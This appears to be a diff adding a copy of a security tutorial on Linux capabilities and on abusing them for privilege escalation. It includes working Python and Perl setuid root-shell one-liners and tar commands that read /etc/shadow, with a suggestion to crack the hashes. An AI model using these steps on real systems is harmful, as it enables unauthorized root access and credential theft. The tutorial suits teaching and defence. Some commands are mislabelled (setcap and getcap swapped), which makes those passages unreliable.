@@ -1,0 +1,124 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
+            <h1 class="post-title entry-title">Linux Privilege Escalation using Capabilities</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/" rel="bookmark"><time class="entry-date published" datetime="2019-11-30T08:59:45+00:00">November 30, 2019</time><time class="updated" datetime="2025-06-07T08:47:25+00:00">June 7, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">In this article, we will discuss the mechanism of <strong>“capability” </strong>and Privilege escalation by abusing it. As we know when the system creates a work context for each user where they achieve their tasks with the privileges that are assigned to them. So, to provide some specific functionalities, it is necessary for a non-privileged user to sometimes temporarily acquire a superuser profile to perform a specific task.</span></p>
+<p class="ai-optimize-7"><span style="color: #000000;">This functionality mainly can be achieved by assigning privileges through <a style="color: #000000;" href="https://en.wikipedia.org/wiki/Sudo">sudo</a>, or <a style="color: #000000;" href="https://en.wikipedia.org/wiki/Setuid">setuid</a> permissions to an executable file which allows the user to adopt the role of the file owner.</span></p>
+<p class="ai-optimize-8"><span style="color: #000000;">To accomplish the same task in a more secure way. The system admin uses “capability” which plays an effective role in the security of Linux based operating systems.</span></p>
+<h3 class="ai-optimize-9"><span style="color: #800000;">Table of Content</span></h3>
+<p class="ai-optimize-10"><span style="color: #000000;"><strong>Introduction to Capability</strong></span></p>
+<ul>
+<li class="ai-optimize-11"><span style="color: #000000;">What is capability?</span></li>
+<li class="ai-optimize-12"><span style="color: #000000;">Difference between capability and SUID.</span></li>
+<li class="ai-optimize-13"><span style="color: #000000;">Use of capabilities.</span></li>
+<li class="ai-optimize-14"><span style="color: #000000;">Working with capability</span></li>
+<li class="ai-optimize-15"><span style="color: #000000;">List of capability</span></li>
+</ul>
+<p class="ai-optimize-16"><span style="color: #000000;"><strong>Abusing capability for Privilege Escalations</strong></span></p>
+<ul>
+<li class="ai-optimize-17"><span style="color: #000000;">Python3</span></li>
+<li class="ai-optimize-18"><span style="color: #000000;">Perl</span></li>
+<li class="ai-optimize-19"><span style="color: #000000;">Tar</span></li>
+</ul>
+<h3 class="ai-optimize-20"><span style="color: #800000;">Introduction to Capability</span></h3>
+<h4 class="ai-optimize-21"><span style="color: #3366ff;"><u>What is capability in Linux </u></span></h4>
+<p class="ai-optimize-22"><span style="color: #000000;">Before capabilities, we only had the binary system of privileged and non-privileged processes and for the purpose of performing permission checks. Traditional UNIX implementations distinguish two categories of processes: privileged processes that referred as superuser or root and unprivileged processes (whose effective UID is nonzero).</span></p>
+<p class="ai-optimize-23"><span style="color: #000000;">Capabilities are those permissions that divide the privileges of kernel users or kernel level programs into small pieces. Allowing a process to have sufficient power to perform specific privileged tasks.</span></p>
+<h4 class="ai-optimize-24"><span style="color: #3366ff;"><u>Difference between capability and SUID </u></span></h4>
+<p class="ai-optimize-25"><span style="color: #000000;"><strong>SUID: </strong>SUID stands for Set User ID and allows users to execute the file as the file owner. In other words, it gives temporary access to a user to run a program or file with the permissions of the file’s owner, rather than the user who runs it. This behavior can easily be detected by using the “find” command. To illustrate, to find all files with SUID set in the current directory, we can use the -perm option, which will print files only with permissions set to 4000.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-QeaikXSH6Bs/XeIpTvBdsqI/AAAAAAAAhto/WInrLFLAlBghsgaJ3-X2SSbMbgzatRArwCLcBGAsYHQ/s1600/0.1.png"/></p>
+<p class="ai-optimize-26"><span style="color: #000000;"><strong>Capability: </strong>Security of Linux systems can be improved by using many actions. One of these measures is called <strong>Linux capabilities</strong> which are maintained by the kernel. In other words, we can say that they are a little unintelligible but similar in principle to SUID. Linux’s thread privilege checking is based on capabilities.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-DFmmOWsjteA/XeIpT6xsU0I/AAAAAAAAhtw/Ayg6v6ZWCJcU-bRo8so63sKg20gEa11IQCLcBGAsYHQ/s1600/0.png"/></p>
+<h4 class="ai-optimize-27"><span style="color: #3366ff;"><u>Uses of capabilities</u></span></h4>
+<p class="ai-optimize-28"><span style="color: #000000;">Capabilities work by breaking the actions normally reserved for root down into smaller portions. The use of capabilities is only beginning to drop into userland applications as most system utilities do not shed their root privileges. Let’s move ahead that how we can use this permission more into our task.</span></p>
+<p class="ai-optimize-29"><span style="color: #000000;"><strong>Limited users’ permission: </strong>As we know, giving away too many privileges by default will result in unauthorized changes of data, backdoors, and circumventing access controls, just to name a few. To overcome this situation, we can simply use the capability to limit users’ permissions.</span></p>
+<p class="ai-optimize-30"><span style="color: #000000;"><strong>Using a fine-grained set of privileges: </strong>Another example can more clearly illustrate the use of capability. Suppose a web server normally runs at port 80 and we also know that we need root permissions to start listening on one of the lower ports (&lt;1024). This web server daemon needs to be able to listen to port 80. Instead of giving this daemon all root permissions, we can set a capability on the related binary, like CAP_NET_BIND_SERVICE. With this specific capability, it can open up port 80 in a much easier way.</span></p>
+<h4 class="ai-optimize-31"><span style="color: #3366ff;"><u>Working with capability</u></span></h4>
+<p class="ai-optimize-32"><span style="color: #000000;">You can achieve the operation of capabilities in many ways. Some of them are listed below:</span></p>
+<p class="ai-optimize-33"><span style="color: #000000;"><strong>Assigning and removing capability</strong>: Executables usually set them on files, and the system automatically grants them to the process when it executes a file with a capability. The system stores the file capability sets in an extended attribute named security.capability. Users can do this by using the attribute CAP_SETCAP capability.</span></p>
+<p class="ai-optimize-34"><span style="color: #000000;">To enable the capability for any file frame command as shown below:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">setcap cap_setuid+ep /home/demo/python3</pre>
+<p class="ai-optimize-35"><span style="color: #000000;">Similarly one can also remove file capability by as below mentioned command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">getcap -r / 2&gt;/dev/null</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/--8-saZqsJUg/XeIpUtDmjSI/AAAAAAAAht0/a0fwwuZtz6M858G2L4hdtqDSroUrWUdCgCLcBGAsYHQ/s1600/2.png"/></p>
+<p class="ai-optimize-36"><span style="color: #000000;"><strong>Reading capability: </strong>Many files or programs have predefined capabilities, so to view whether a file has any capability set, you can simply run the command as:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">setcap -r /home/demo/python3</pre>
+<p class="ai-optimize-37"><span style="color: #000000;">If you want to find out which capabilities your system has already set, you can search your whole file-system recursively with the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">getcap -r / 2&gt;/dev/null</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-ZEpLdVo1unQ/XeIpVEop_nI/AAAAAAAAht4/P7LY6p2JIrYVgV1um23_okYBDgQDHfluwCLcBGAsYHQ/s1600/3.png"/></p>
+<h4 class="ai-optimize-38"><span style="color: #3366ff;"><u>List of Capability </u></span></h4>
+<p class="ai-optimize-39"><span style="color: #000000;">Based on functionality, we categorize the capability into a total of 36 in the count. Some of the most commonly used ones are shown below.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-b2lP_MwsxDs/XeIpVZoQULI/AAAAAAAAht8/8k2iTTw5eZwb8QQnaU8NF23ODrv1dwUsACLcBGAsYHQ/s1600/4.png"/></p>
+<h3 class="ai-optimize-40"><span style="color: #800000;">Abusing Capabilities Privilege Escalations</span></h3>
+<h4 class="ai-optimize-41"><span style="color: #3366ff;"><u>Python Capability </u></span></h4>
+<p class="ai-optimize-42"><span style="color: #000000;">Suppose the system administrator wants to grant superuser permission for any binary program. For instance, consider python3, which should only be available to a specific user, and the admin doesn’t want to give SUID or sudo permission. In such cases, the admin can use capabilities for the python3 program that the specific user — let’s say user “demo” — should execute. This can be accomplished with the following commands on the host machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">which python3
+cp /usr/bin/python3 /home/demo/
+setcap cap_setuid+ep /home/demo/python3</pre>
+<p class="ai-optimize-43"><span style="color: #000000;">As a result, the admin has granted the user demo the privilege to run the python3 program as root by using cap_setuid+ep. This means the system assigns all privilege to the user for that program. But if you try to find 4000 permission files or programs, then it might not show for /home/dome/python3.</span></p>
+<p class="ai-optimize-44"><span style="color: #000000;"><strong><em>Note:</em></strong><em> Other users should not access the user home directory because if non-root users access it, they will also gain the privileges of the capabilities set for the user demo.</em></span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-_NY5PVXGp98/XeIpVhInt1I/AAAAAAAAhuA/zv3csezeN-YLPTlqcoU_9jI98LKPTjaAQCLcBGAsYHQ/s1600/5.png"/></p>
+<h4 class="ai-optimize-45"><span style="color: #3366ff;"><u>Exploiting capability using Python</u></span></h4>
+<p class="ai-optimize-46"><span style="color: #000000;">Assuming an intruder compromises the host machine as a local user and spawns the least privileged shell. He looks for system capabilities and finds that the system gives the empty capability (ep) over suid to python3 for user demo. This means the system assigns all privileges to the user for that program. Therefore, by taking advantage of this permission, he can escalate from a low-privilege shell to a high-privilege shell.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">getcap -r / 2&gt;/dev/null
+pwd
+ls -al python3
+./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+id</pre>
+<p class="ai-optimize-47"><span style="color: #000000;">Hence, you can observe that the local user demo has accessed the root shell as shown in the given image.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-KJSuOanH3hs/XeIpWCf4PEI/AAAAAAAAhuE/CF8cYc7dVModbfoIf713i_j6OrMYF9KcACLcBGAsYHQ/s1600/6.png"/></p>
+<h4 class="ai-optimize-48"><span style="color: #3366ff;"><u>Perl Capability </u></span></h4>
+<p class="ai-optimize-49"><span style="color: #000000;">We have another example “perl” which is the same as above where the admin should use capabilities for the perl program that a specific user. Let’s say user “demo”, will execute. The following commands on the host machine can accomplish this.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">which perl
+cp /usr/bin/perl /home/demo/
+setcap cap_setuid+ep /home/demo/perl</pre>
+<p class="ai-optimize-50"><span style="color: #000000;">As a result, the admin has granted demo the privilege to run the python3 program as root by using cap_setuid+ep. This means the admin has assigned all privilege to the user for that program.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-PiPUhnAFgOQ/XeIpWVyQL1I/AAAAAAAAhuI/Eysz7iYu4wU1f09qvyHPK1Los7UQ3ifNgCLcBGAsYHQ/s1600/7.png"/></p>
+<h4 class="ai-optimize-51"><span style="color: #3366ff;"><u>Exploiting capability using Perl</u></span></h4>
+<p class="ai-optimize-52"><span style="color: #000000;">Repeat the above step for the exploit Perl program to escalate the root privilege:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">getcap -r / 2&gt;/dev/null
+pwd
+ls -al perl
+./perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
+id</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-e7Jo3nTW2Ts/XeIpWdCv7wI/AAAAAAAAhuM/PH_uLypq918rSbm47oYAbFXtVleS0B1hwCLcBGAsYHQ/s1600/8.png"/></p>
+<h4 class="ai-optimize-53"><span style="color: #3366ff;"><u>Tar Capability </u></span></h4>
+<p class="ai-optimize-54"><span style="color: #000000;">We have another example, “tar,” which is the same as above, where the admin uses capabilities to extract high-privilege files that restrict other users, and a specific user, let’s say user “demo,” extracts them.</span></p>
+<p class="ai-optimize-55"><span style="color: #000000;">Let’s take an example: The admin wants to assign a role, where the user “demo” can take the backup of files as root. For this task, the admin has set read capability on the tar program. This can be accomplished with the following commands on the host machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">which tar
+cp /bin/tar /home/demo/
+setcap cap_dac_read_search+ep /home/demo/tar</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-WRI1ndyugDw/XeIpWpWhMLI/AAAAAAAAhuQ/9MDAJYhZ6NgHIUb__kWJ1QnYHdlUqPjCgCLcBGAsYHQ/s1600/9.1.png"/></p>
+<h4 class="ai-optimize-56"><span style="color: #3366ff;"><u>Exploiting the capability using tar</u></span></h4>
+<p class="ai-optimize-57"><span style="color: #000000;">Repeat the same procedure to escalate the privilege, take access to the host machine as a local user, and move ahead for privilege escalation. Since this time admin has used CAP_DAC_READ_SEARCH which will help us to bypass file read permission checks and directory read and execute permission checks.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">getcap -r / 2&gt;/dev/null
+pwd
+ls -al tar</pre>
+<p class="ai-optimize-58"><span style="color: #000000;">In this, we try to read the shadow file where the system stores all user password hashes; for this, you have to follow the steps below.</span></p>
+<ul>
+<li class="ai-optimize-59"><span style="color: #000000;">Compress the /etc/shadow in the current directory with the help of the tar program.</span></li>
+<li class="ai-optimize-60"><span style="color: #000000;">You will get shadow.tar in your current directory.</span></li>
+<li class="ai-optimize-61"><span style="color: #000000;">Extract the shadow.tar and you will get a directory as “etc/shadow”.</span></li>
+<li class="ai-optimize-62"><span style="color: #000000;">Use cat/head/tail or program to read the hashes of passwords.</span></li>
+</ul>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">./tar cvf shadow.tar /etc/shadow
+ls
+./tar -xvf shadow.tar</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-b3644p0Bs_w/XeIpXefPKcI/AAAAAAAAhuU/BmIyU1zimQ4tqVwsbMEzgVn3HLetXA9zQCLcBGAsYHQ/s1600/9.png"/></p>
+<p class="ai-optimize-63"><span style="color: #000000;">As a result, you will have “etc/shadow” file your current directory and you can read the hashes of the password as shown here.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">tail -8 etc/shadow</pre>
+<p class="ai-optimize-64"><span style="color: #000000;">A malicious user can break this password using a tool such as a john the ripper or hash killer etc.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-yn41un2uWV8/XeIpTyqOImI/AAAAAAAAhts/TyqIpU2fKYoxJoG7h7mdSabts9sffP2qwCLcBGAsYHQ/s1600/10.png"/></p>
+<p class="ai-optimize-65"><span style="color: #000000;"><strong><u>Conclusion</u></strong>:  The system admin should be aware of security loopholes during assigning such capability which can affect the integrity of kernel that can lead to privilege escalation.</span></p>
+<h4 class="ai-optimize-66">References:</h4>
+<p class="ai-optimize-67">http://lists.linuxfromscratch.org/pipermail/hlfs-dev/2011-August/004870.html</p>
+<p class="ai-optimize-68"><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
+<p class="ai-optimize-6"><span style="color: #000000;">To Learn more about Privilege Escalation. Follow this</span> <a href="https://www.hackingarticles.in/category/privilege-escalation/">Link.</a></p>
+<p class="ai-optimize-69"><span style="color: #000000;"><strong>Author</strong>: Komal Singh is a Cyber Security Researcher and Technical Content Writer. She is a completely enthusiastic pentester and Security Analyst at Ignite Technologies. Contac</span>t <a href="https://www.linkedin.com/in/komal-rajput-26b783131/"><strong>Here</strong></a></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
